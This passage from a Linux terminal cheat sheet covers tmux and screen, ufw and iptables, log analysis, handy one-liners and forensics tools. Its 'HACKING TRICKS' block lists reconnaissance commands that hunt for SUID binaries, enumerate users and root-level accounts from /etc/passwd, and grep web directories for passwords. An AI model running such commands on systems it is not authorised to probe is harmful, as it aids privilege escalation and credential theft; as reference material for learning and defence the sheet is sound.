# > Ctrl+b arrow  — navigate panes
# > Ctrl+b d      — detach session (keeps running)
# > Ctrl+b [      — scroll mode (q to exit)

# ── SCREEN ────────────────────────────────────────────────
> screen                       # start screen session
> screen -S name               # named session
> screen -ls                   # list sessions
> screen -r name               # reattach session
# > Ctrl+a d      — detach
# > Ctrl+a c      — new window
# > Ctrl+a n      — next window
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    23  ·  F I R E W A L L   &   I P T A B L E S             ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── UFW (Uncomplicated Firewall) ──────────────────────────
> ufw status                   # show firewall status
> ufw enable                   # enable firewall
> ufw disable                  # disable firewall
> ufw allow 22                 # allow SSH
> ufw allow 80/tcp             # allow HTTP
> ufw deny 23                  # deny telnet
> ufw allow from 192.168.1.0/24  # allow subnet
> ufw delete allow 80          # remove rule
> ufw reset                    # reset all rules

# ── IPTABLES ──────────────────────────────────────────────
> iptables -L                  # list all rules
> iptables -L -n -v            # detailed rules
> iptables -A INPUT -p tcp --dport 22 -j ACCEPT   # allow SSH
> iptables -A INPUT -p tcp --dport 80 -j ACCEPT   # allow HTTP
> iptables -A INPUT -j DROP    # drop all other input
> iptables -F                  # flush (clear) all rules
> iptables-save > rules.txt    # save rules
> iptables-restore < rules.txt # restore rules
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    24  ·  L O G   A N A L Y S I S                           ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── KEY LOG FILES ─────────────────────────────────────────
> /var/log/syslog              # general system log
> /var/log/auth.log            # authentication + sudo logs
> /var/log/kern.log            # kernel messages
> /var/log/apache2/access.log  # Apache web server access
> /var/log/apache2/error.log   # Apache errors
> /var/log/nginx/access.log    # Nginx access log
> /var/log/fail2ban.log        # fail2ban activity
> /var/log/dpkg.log            # package install history

# ── READING LOGS ──────────────────────────────────────────
> tail -f /var/log/syslog      # follow live system log
> tail -f /var/log/auth.log    # follow auth log live
> grep "Failed" /var/log/auth.log        # find failed logins
> grep "CRON" /var/log/syslog            # cron activity
> journalctl                   # all systemd logs
> journalctl -u ssh            # SSH service logs
> journalctl --since "1 hour ago"        # last hour logs
> journalctl -f                # live log stream
> last                         # last login history
> lastb                        # failed login attempts
> ausearch -m USER_LOGIN       # audit login events
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║    25  ·  O N E - L I N E R S   &   P O W E R   T R I C K S ║
╚══════════════════════════════════════════════════════════════╝
</pre>

</div>

```bash
# ── SYSTEM ────────────────────────────────────────────────
> sudo !!                      # rerun last command as root
> cd -                         # switch to previous directory
> mkdir -p ~/a/b/c && cd $_    # make nested dirs and cd into it
> ls -lhS                      # list files sorted by size
> du -sh * | sort -rh | head   # top 10 largest items

# ── FILE TRICKS ───────────────────────────────────────────
> cp file{,.bak}               # quick backup copy of file
> diff <(ls dir1) <(ls dir2)   # compare directory contents
> cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32  # random password
> python3 -m http.server 8080  # instant HTTP file server
> base64 file.txt              # base64 encode file
> base64 -d encoded.txt        # base64 decode

# ── NETWORK ───────────────────────────────────────────────
> curl ifconfig.me             # get your public IP
> curl icanhazip.com           # get public IP (alternative)
> curl -s https://ipinfo.io/json  # IP geolocation info
> ss -tulnp | grep LISTEN      # all listening ports
> watch -n 1 'ss -s'           # live socket stats

# ── HACKING TRICKS ────────────────────────────────────────
> find / -perm -4000 2>/dev/null | xargs ls -la  # all SUID files
> cat /etc/passwd | cut -d: -f1                  # list all users
> awk -F: '($3==0)' /etc/passwd                  # find root-level users
> grep -r "password" /var/www/ 2>/dev/null       # find passwords in web files
> history | awk '{print $2}' | sort | uniq -c | sort -rn | head  # most used commands

# ── FORENSICS ─────────────────────────────────────────────
> md5sum file.txt              # file integrity check MD5
> sha256sum file.txt           # file integrity check SHA256
> strings binary               # extract readable strings from binary
> file mystery_file            # detect file type by magic bytes
> xxd file.bin | head          # hex dump of binary file
> binwalk firmware.bin         # extract embedded files from binary
```

---

<div align="center">

<pre>
╔══════════════════════════════════════════════════════════════╗
║                   Q U I C K   R E F E R E N C E             ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  ✦  Navigation & Files      ✦  Permissions & Users          ║
║  ✦  Processes & Services    ✦  Networking & SSH             ║
║  ✦  Package Management      ✦  Disk & Compression           ║
║  ✦  Search & Filter         ✦  Bash Scripting               ║
║  ✦  Kali Hacking Tools      ✦  Netcat & Shells              ║
║  ✦  Git & Docker            ✦  Tmux & Screen                ║
║  ✦  Firewall & iptables     ✦  Log Analysis                 ║
║  ✦  One-Liners & Tricks     ✦  Forensics                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
</pre>

```bash
> "The command line is not just a tool — it is a language."
> "Master the terminal. Master the system."
> "grep harder. find faster. hack smarter."
```

*crafted for those who live in the terminal*

</div>
